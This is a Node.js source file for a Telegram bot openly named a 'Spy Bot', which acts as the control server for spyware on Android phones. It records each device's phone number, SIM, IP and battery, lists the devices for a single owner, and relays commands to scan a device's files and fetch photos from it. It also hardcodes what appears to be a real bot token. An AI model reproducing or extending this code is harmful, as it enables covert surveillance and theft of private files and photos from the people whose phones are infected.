const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const express = require('express');
const axios = require('axios');

const token = '8811118034:AAHr5UjOeT43-D4zPadC80V6dmQpgsyqIcM';
const YOUR_USER_ID = 2062068620;
const bot = new TelegramBot(token, { polling: true });
const app = express();
app.use(express.json());

// 📁 Data Store (JSON file)
const dataFile = path.join(__dirname, 'devices.json');
let devices = {};
if (fs.existsSync(dataFile)) {
    devices = JSON.parse(fs.readFileSync(dataFile, 'utf8'));
}

function saveDevices() {
    fs.writeFileSync(dataFile, JSON.stringify(devices, null, 2));
}

// ✅ /devices — Saare devices ki detail
app.get('/api/devices', (req, res) => {
    res.json(devices);
});

// ✅ App register karne par
app.post('/api/register-device', (req, res) => {
    const { deviceId, deviceName, phoneNumber, battery, ip, sim, online, time } = req.body;
    devices[deviceId] = { 
        deviceName, 
        phoneNumber, 
        battery, 
        ip, 
        sim, 
        online, 
        time,
        lastSeen: Date.now() 
    };
    saveDevices();
    res.json({ success: true });
});

// ✅ Bot commands
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    bot.sendMessage(chatId, `🔥 Welcome to Burhan Spy Bot! 🔥\n\n🎯 Owner: Sheikh Burhan\n\n📜 Commands:\n/devices - View all devices\n/files - Scan Files\n/getphoto - Get Photo\n/status - Device Status\n/help - Commands ka format`);
});

bot.onText(/\/devices/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    
    const online = Object.entries(devices).filter(([id, d]) => d.online === 'online');
    const offline = Object.entries(devices).filter(([id, d]) => d.online !== 'online');
    
    let message = "📱 ALL DEVICES (Total: " + Object.keys(devices).length + ")\n\n";
    message += "🟢 ONLINE (" + online.length + "):\n";
    if (online.length > 0) {
        online.forEach(([id, d]) => {
            message += `🔑 ID: ${id}\n`;
            message += `🔑 Key: ${d.deviceName || 'N/A'}\n`;
            message += `📅 Expiry: ${d.expiry || 'N/A'}\n`;
            message += `📱 Android: ${d.android || 'N/A'}\n`;
            message += `💾 RAM: ${d.ram || 'N/A'} MB\n`;
            message += `📦 Storage: ${d.storage || 'N/A'} GB\n`;
            message += `🔋 Battery: ${d.battery || 'N/A'}%\n`;
            message += `📊 Installs: ${d.installs || 'N/A'}\n`;
            message += `📊 Status: 🟢 ONLINE\n`;
            message += `🕒 ${d.time || 'N/A'}\n\n`;
        });
    } else {
        message += "No online devices.\n";
    }
    
    message += "\n🔴 OFFLINE (" + offline.length + "):\n";
    if (offline.length > 0) {
        offline.forEach(([id, d]) => {
            message += `🔑 ID: ${id}\n`;
            message += `🔑 Key: ${d.deviceName || 'N/A'}\n`;
            message += `📅 Expiry: ${d.expiry || 'N/A'}\n`;
            message += `📱 Android: ${d.android || 'N/A'}\n`;
            message += `💾 RAM: ${d.ram || 'N/A'} MB\n`;
            message += `📦 Storage: ${d.storage || 'N/A'} GB\n`;
            message += `🔋 Battery: ${d.battery || 'N/A'}%\n`;
            message += `📊 Installs: ${d.installs || 'N/A'}\n`;
            message += `📊 Status: 🔴 OFFLINE\n`;
            message += `🕒 ${d.time || 'N/A'}\n\n`;
        });
    } else {
        message += "No offline devices.\n";
    }
    
    bot.sendMessage(chatId, message);
});

// ✅ /files <ID> — Files scan karo
bot.onText(/\/files (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    const deviceId = match[1];
    if (!devices[deviceId]) {
        bot.sendMessage(chatId, "❌ Device not found!");
        return;
    }
    // App ko command bhejo
    axios.post('http://localhost:3000/api/command', { deviceId, command: 'scan_files' })
        .then(() => {
            bot.sendMessage(chatId, `📁 Scanning files for device ${deviceId}...`);
        })
        .catch(() => {
            bot.sendMessage(chatId, "❌ Command send failed!");
        });
});

// ✅ /getphoto <ID> <path> — Photo download karo
bot.onText(/\/getphoto (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    const deviceId = match[1];
    const photoPath = match[2];
    if (!devices[deviceId]) {
        bot.sendMessage(chatId, "❌ Device not found!");
        return;
    }
    // App ko photo bhejne ka command
    axios.post('http://localhost:3000/api/command', { deviceId, command: 'get_photo', path: photoPath })
        .then(() => {
            bot.sendMessage(chatId, `📸 Photo request sent: ${photoPath}`);
        })
        .catch(() => {
            bot.sendMessage(chatId, "❌ Command send failed!");
        });
});

// ✅ Authorization check
function isAuthorized(msg) {
    return msg.from.id === YOUR_USER_ID;
}

app.listen(3000, () => {
    console.log("Server running on port 3000");
});
